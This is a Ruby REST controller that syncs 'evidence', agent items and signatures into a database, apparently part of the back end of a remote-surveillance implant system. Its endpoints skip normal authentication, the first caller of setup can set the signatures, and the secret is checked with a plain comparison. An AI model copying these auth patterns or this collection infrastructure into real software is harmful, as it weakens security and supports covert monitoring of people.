require 'rcs-common/path_utils'

require_relative '../rest'
require_relative '../db_objects/signature'
require_relative '../db_objects/status'

module RCS
  module DB
    class SyncController < RESTController

      bypass_auth [:evidence, :items, :status, :setup, :agent]
      require_license :evidence, :items, :status, :setup, :agent, license: :archive

      def evidence
        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        evidence_attributes = @params['evidence']
        evidence_path = @params['path']

        if evidence_attributes.blank? or evidence_path.blank?
          return bad_request(msg: 'Invalid parameters')
        end

        trace :info, "Storing evidence #{evidence_attributes['_id']}"
        result = store_evidence(evidence_path[1], evidence_attributes, @params['grid'])

        ok(msg: "Stored")
      end

      def items
        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        items = @params['items']

        return bad_request(msg: 'Invalid parameters') if items.blank?

        store_items(items)

        ok(msg: "Stored")
      end

      def status
        unless has_signatures?
          return server_error(msg: 'Need signatures', result: 'NEED_SIGNATURES')
        end

        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        status = ::Status.where(type: 'db').first
        if status
          ok(status: status)
        else
          server_error(msg: 'Status not computed yet')
        end
      end


      def setup
        signatures = @params['signatures']

        return bad_request(msg: 'Expected signatures') if signatures.blank?

        if has_signatures?
          if valid_signature?
            ok(msg: 'Nothing was changed')
          else
            server_error(msg: 'Signature was alredy written and cannot be changed with a different one')
          end
        else
          store_signatures(signatures)
          ok(msg: "Stored")
        end
      end

      def agent
        return not_authorized(msg: 'Invalid signature') unless valid_signature?

        agent_id = Moped::BSON::ObjectId.from_string(@params['agent_id']) rescue nil

        return bad_request(msg: 'Invalid parameters') if agent_id.blank?

        exist = ::Item.agents.where(id: agent_id).count != 0

        ok(result: (exist ? 'EXISTS' : 'MISSING'))
      end

      private

      def valid_signature?
        received = @request[:headers][:x_sync_signature]
        expected = Signature.where(scope: 'network').first.try(:value)
        !received.blank? and received == expected
      end

      def has_signatures?
        Signature.all.count > 0
      end

      def store_evidence(target_id, attributes, grid_attributes = nil)
        collection = ::Evidence.collection_class(target_id)
        return unless collection.where(id: attributes["_id"]).count.zero?

        unless grid_attributes.blank?
          grid_attributes.symbolize_keys!
          content = grid_attributes.delete(:content)

          # TODO: how to store the grid file with a custom id?
          # grid_attributes[:_id] = Moped::BSON::ObjectId.from_string(grid_attributes[:_id])
          grid_attributes.delete(:_id)

          id = RCS::DB::GridFS.put(content, grid_attributes, target_id)
          attributes['data']['_grid'] = Moped::BSON::ObjectId.from_string(id)
        end

        evi = collection.new(attributes)
        evi._id = attributes["_id"]
        evi.save!

        evi.enqueue
      end

      def store_items(items)
        items.each do |attributes|
          next unless ::Item.where(id: attributes["_id"]).count.zero?
          item = ::Item.new(attributes)
          item[:user_ids] = []
          item.path = item.path.map { |id| Moped::BSON::ObjectId.from_string(id) }
          item._id = attributes['_id']
          item.save!
        end
      end

      def store_signatures(signatures)
        signatures.each do |attributes|
          doc = Signature.new(attributes)
          doc._id = attributes["_id"]
          doc.save!
        end
      end
    end
  end
end
